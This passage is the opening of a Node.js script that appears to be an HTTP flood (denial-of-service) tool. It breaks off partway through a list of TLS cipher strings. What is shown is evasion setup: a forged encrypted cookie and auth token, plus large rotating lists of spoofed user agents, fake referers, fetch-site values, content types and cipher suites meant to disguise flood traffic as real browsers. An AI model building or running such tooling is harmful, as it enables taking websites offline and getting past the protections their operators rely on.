const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
request = require('request'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
randstr = require('randomstring');
const crypto = require('crypto');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
  

// Tạo một chuỗi ngẫu nhiên để sử dụng làm giá trị cookie
const randomString = crypto.randomBytes(20).toString('hex');

// Tạo một khóa bí mật ngẫu nhiên để sử dụng cho việc mã hóa cookie
const secretKey = crypto.randomBytes(32);

// Tạo đối tượng cipher để mã hóa cookie bằng thuật toán AES-256-CBC
var ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));

// Mã hóa chuỗi ngẫu nhiên và lưu kết quả vào biến encrypted
let encrypted = ciphe.update(randomString, 'utf8', 'hex');
encrypted += ciphe.final('hex');

// Tạo cookie với giá trị đã mã hóa
const cookieValue = encrypted;

const bytes = crypto.randomBytes(16); // Tạo 16 byte ngẫu nhiên
const xAuthToken = bytes.toString('hex'); // Chuyển đổi thành chuỗi hex




try {
  var colors = require('colors');
} catch (err) {
  console.log('\x1b[36mInstalling\x1b[37m the requirements');
  execSync('npm install colors');
  console.log('Done.');
  process.exit();
}

const uap = [
    "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
    "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
    "portalmmm/2.0 N410i(c20;TB) ",
    "Python-urllib/2.5",
    "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
    "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
    "SearchExpress",
    "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
    "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
    "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
    "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonT100/R101",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
    "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
    "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
    "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
    "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonT68/R201A",
    "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
    "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
    "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)",
    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
    "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
    'Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28',
  
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
  ];
  
 const fetch_site = [
  "same-origin",
  "same-site",
  "cross-site",
  "none"
];

const type = [
  "text/plain",
  "text/html",
  "text/html; charset=utf-8",
  "application/json",
  "application/xml",
  "multipart/form-data",
  "application/octet-stream",
  "image/jpeg",
  "image/png",
  "audio/mpeg",
  "video/mp4",
  "application/javascript",
  "application/pdf",
  "application/vnd.ms-excel",
  "application/vnd.ms-powerpoint",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/zip",
  "image/gif",
  "image/bmp",
  "image/tiff",
  "audio/wav",
  "audio/midi",
  "video/avi",
  "video/mpeg",
  "video/quicktime",
  "text/csv",
  "text/xml",
  "text/css",
  "text/javascript",
  "application/graphql",
  "application/x-www-form-urlencoded",
  "application/vnd.api+json",
  "application/ld+json",
  "application/x-pkcs12",
  "application/x-pkcs7-certificates",
  "application/x-pkcs7-certreqresp",
  "application/x-pem-file",
  "application/x-x509-ca-cert",
  "application/x-x509-user-cert",
  "application/x-x509-server-cert",
  "application/x-bzip",
  "application/x-gzip",
  "application/x-7z-compressed",
  "application/x-rar-compressed",
  "application/x-shockwave-flash"
];



const referer = [
  'https://www.google.com',
  'https://www.facebook.com',
  'https://www.twitter.com',
  'https://www.youtube.com',
  'https://www.amazon.com',
  'https://www.netflix.com',
  'https://www.instagram.com',
  'https://www.yahoo.com',
  'https://www.stackoverflow.com',
  'https://www.github.com',
  'https://www.linkedin.com',
  'https://www.cnn.com',
  'https://www.apple.com',
  'https://www.microsoft.com',
  'https://www.wikipedia.org',
  'https://www.nytimes.com',
  'https://www.msn.com',
  'https://www.reddit.com',
  'https://www.quora.com',
  'https://www.npr.org',
  'https://www.bbc.com',
  'https://www.theguardian.com',
  'https://www.huffingtonpost.com',
  'https://www.washingtonpost.com',
  'https://www.wsj.com',
  'https://www.bloomberg.com',
  'https://www.cnbc.com',
  'https://www.merriam-webster.com',
  'https://www.dictionary.com',
  'https://www.thedailybeast.com',
  'https://www.thedailyshow.com',
  'https://www.colbertnation.com',
  'https://www.nationalgeographic.com',
  'https://www.nasa.gov',
  'https://www.nypl.org',
  'https://www.britannica.com',
  'https://www.healthline.com',
  'https://www.webmd.com',
  'https://www.mayoclinic.org',
  'https://www.cdc.gov',
  'https://www.nih.gov',
  'https://www.medlineplus.gov',
  'https://www.cancer.gov',
  'https://www.fda.gov',
  'https://www.nature.com',
  'https://www.sciencemag.org',
  'https://www.scientificamerican.com',
  'https://www.who.int',
  'https://www.un.org',
  'https://www.worldbank.org',
  'https://www.imf.org',
  'https://www.wto.org',
  'https://www.oecd.org',
  'https://www.europa.eu',
  'https://www.nato.int',
  'https://www.icrc.org',
  'https://www.amnesty.org',
  'https://www.hrw.org',
  'https://www.greenpeace.org',
  'https://www.oxfam.org',
  'https://www.doctorswithoutborders.org',
  'https://www.unicef.org',
  'https://www.savethechildren.org',
  'https://www.redcross.org',
  'https://www.wikipedia.org',
  'https://www.wikimedia.org',
  'https://www.mozilla.org',
  'https://www.apache.org',
  'https://www.mysql.com',
  'https://www.php.net',
  'https://www.python.org',
  'https://www.ruby-lang.org',
  'https://www.jquery.com',
  'https://www.reactjs.org',
  'https://www.angularjs.org',
  'https://www.vuejs.org',
  'https://www.bootstrap.com',
  'https://www.materializecss.com',
  'https://www.sass-lang.com',
  'https://www.lesscss.org',
  'https://www.d3js.org',
  'https://www.highcharts.com',
  'https://www.chartjs.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.openstreetmap.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.chartjs.org',
  'https://www.highcharts.com',
  'https://www.d3js.org',
  'https://www.lesscss.org',
  'https://www.sass-lang.com',
  'https://www.materializecss.com',
  'https://www.bootstrap.com',
  'https://www.vuejs.org',
  'https://www.angularjs.org',
  'https://www.reactjs.org',
  'https://www.jquery.com',
  'https://www.ruby-lang.org',
  'https://www.python.org',
  'https://www.php.net',
  'https://www.mysql.com',
  'https://www.apache.org',
  'https://www.mozilla.org',
  'https://www.wikimedia.org',
  'https://www.wikipedia.org',
  'https://www.redcross.org',
  'https://www.savethechildren.org',
  'https://www.unicef.org',
  'https://www.doctorswithoutborders.org',
  'https://www.oxfam.org',
  'https://www.greenpeace.org',
  'https://www.hrw.org',
  'https://www.amnesty.org',
  'https://www.icrc.org',
  'https://www.nato.int',
  'https://www.europa.eu',
  'https://www.oecd.org',
  'https://www.wto.org',
  'https://www.imf.org',
  'https://www.worldbank.org',
  'https://www.un.org',
  'https://www.who.int',
  'https://www.scientificamerican.com',
  'https://www.sciencemag.org',
  'https://www.nature.com',
  'https://www.fda.gov',
  'https://www.cancer.gov',
  'https://www.medlineplus.gov',
  'https://www.nih.gov',
  'https://www.cdc.gov',
  'https://www.mayoclinic.org',
  'https://www.webmd.com',
  'https://www.healthline.com',
  'https://www.britannica.com',
  'https://www.nypl.org',
  'https://www.nasa.gov',
  'https://www.nationalgeographic.com',
  'https://www.colbertnation.com',
  'https://www.thedailyshow.com',
  'https://www.thedailybeast.com',
  'https://www.dictionary.com',
  'https://www.merriam-webster.com',
  'https://www.cnbc.com',
  'https://www.bloomberg.com',
  'https://www.wsj.com',
  'https://www.washingtonpost.com',
  'https://www.huffingtonpost.com',
  'https://www.theguardian.com',
  'https://www.bbc.com',
  'https://www.npr.org',
  'https://www.quora.com',
  'https://www.reddit.com',
  'https://www.msn.com',
  'https://www.nytimes.com',
  'https://www.wikipedia.org',
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.cnn.com',
  'https://www.linkedin.com',
  'https://www.github.com',
  'https://www.stackoverflow.com',
  'https://www.yahoo.com',
  'https://www.instagram.com',
  'https://www.netflix.com',
  'https://www.amazon.com',
  'https://anotepad.com/',
  'https://www.youtube.com',
  'https://www.twitter.com',
  'https://www.facebook.com',
  'https://www.google.com',
  'https://tls.mrrage.xyz/nginx_status'
];

const platform = [
  "Windows",
  "Windows Phone",
  "Macintosh",
  "Linux",
  "iOS",
  "Android",
  "PlayStation 4",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other"
];
cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",

  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  
  
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
